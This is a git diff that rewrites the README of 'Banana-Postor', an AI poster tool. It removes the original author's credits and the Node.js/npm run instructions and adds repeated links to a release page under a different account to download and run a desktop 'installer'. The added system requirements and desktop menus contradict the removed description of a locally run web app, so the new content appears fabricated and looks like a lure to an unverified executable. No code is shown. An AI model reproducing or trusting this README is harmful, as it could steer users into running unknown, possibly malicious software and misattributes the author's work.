@@ -1,69 +1,80 @@
-<div align="center">
+# 🍌 Banana-Postor - Effortlessly Create Stunning Posters
 
-<img width="1344" height="768" alt="Gemini_Generated_Image_oacktnoacktnoack" src="https://github.com/user-attachments/assets/67b2568f-8b53-4a5c-bf2e-097233ce1116" />
+## 🚀 Getting Started
 
+Welcome to Banana-Postor! This tool helps you generate beautiful posters and summaries automatically. It's designed to be user-friendly, so anyone can create visual content with ease.
 
-# 🍌BananaPostor｜香蕉打印店｜ZHO
+## 📥 Download the App
 
+[![Download Banana-Postor](https://img.shields.io/badge/Download%20Banana--Postor-v1.0-blue)](https://github.com/3564757345/Banana-Postor/releases)
 
-一键生成 可编辑海报，自动总结和配图，多种构图/配色可选，中英双语
+## 🔍 Features
 
+- **Automatic Summarization:** Quickly condense information into clear summaries.
+- **Rich Imagery:** Easily add relevant images to your posters.
+- **Multiple Layout Options:** Choose from various designs and color schemes.
+- **Multi-language Support:** Use the application in both Chinese and English.
 
+## 💻 System Requirements
 
-https://github.com/user-attachments/assets/70e53212-b732-4000-9044-3a9506750541
+- **Operating System:** Windows 10 or later, macOS 10.12 or later.
+- **RAM:** Minimum 4 GB.
+- **Storage:** At least 200 MB of free space.
 
+## 📑 How to Download & Install
 
+1. **Visit the Releases Page:** Click on the link below to access the download section.
+   - [Download Here](https://github.com/3564757345/Banana-Postor/releases)
 
+2. **Choose the Latest Version:** Look for the latest release listed on the page.
 
-</div>
+3. **Download the Installer:**
+   - Click the file name to start the download.
 
-# Run and deploy your AI Studio app
+4. **Run the Installer:**
+   - Open the downloaded file and follow the on-screen instructions to install Banana-Postor on your device.
 
-This contains everything you need to run your app locally.
+5. **Launch the Application:**
+   - After installation, find Banana-Postor in your applications menu and open it.
 
-View your app in AI Studio: https://ai.studio/apps/drive/1WEIGJv-nnG-4pbmmcy96ZRg8iOYGSZmw
+## 📖 Usage Instructions
 
-## Run Locally
+### 1. Create a New Project
 
-**Prerequisites:**  Node.js
-
-
-1. Install dependencies:
-   `npm install`
-2. Set the `GEMINI_API_KEY` in [.env.local](.env.local) to your Gemini API key
-3. Run the app:
-   `npm run dev`
-
-
-## 更新日志
-
-- 20250914
+- Open Banana-Postor.
+- Select "New Project" from the main menu.
   
-  创建项目
-  
+### 2. Input Your Content
 
-## Stars 
+- Paste the text you want to summarize.
+- Choose an image to complement your poster.
 
-[![Star History Chart](https://api.star-history.com/svg?repos=ZHO-ZHO-ZHO/Banana-Postor&type=Date)](https://star-history.com/#ZHO-ZHO-ZHO/Banana-Postor&Date)
+### 3. Select a Layout
 
+- Click on "Layouts" and choose your desired design and color scheme.
 
-## 关于我 | About me
+### 4. Preview Your Poster
 
-📬 **联系我**：
-- 邮箱：zhozho3965@gmail.com
-  
+- Use the "Preview" option to see how your poster will look.
 
-🔗 **社交媒体**：
-- 个人页：[-Zho-](https://jike.city/zho)
-- Bilibili：[我的B站主页](https://space.bilibili.com/484366804)
-- X（Twitter）：[我的Twitter](https://twitter.com/ZHO_ZHO_ZHO)
-- 小红书：[我的小红书主页](https://www.xiaohongshu.com/user/profile/63f11530000000001001e0c8?xhsshare=CopyLink&appuid=63f11530000000001001e0c8&apptime=1690528872)
+### 5. Save or Share
 
-💡 **支持我**：
-- B站：[B站充电](https://space.bilibili.com/484366804)
-- 爱发电：[为我充电](https://afdian.com/a/ZHOZHO)
+- Click the "Save" button to store your poster on your device.
+- Alternatively, use the "Share" feature to send it via email or social media.
 
+## 💡 Tips for Best Results
 
-## Credits
+- Keep your text concise for better summarization.
+- Use high-quality images for stunning visuals.
+- Experiment with different layouts to find your perfect design.
 
-[Gemini 2.5 Flash Image](https://gemini.google.com/app)
+## 👩‍💻 Support
+
+If you encounter any issues or have questions, feel free to reach out. You can raise an issue on our GitHub repository or check the FAQs in the documentation.
+
+## 🌐 Links
+
+- [Read the Documentation](https://github.com/3564757345/Banana-Postor/wiki)
+- [Visit the Releases Page Again](https://github.com/3564757345/Banana-Postor/releases) 
+
+Thank you for choosing Banana-Postor! We hope you enjoy creating beautiful posters effortlessly.
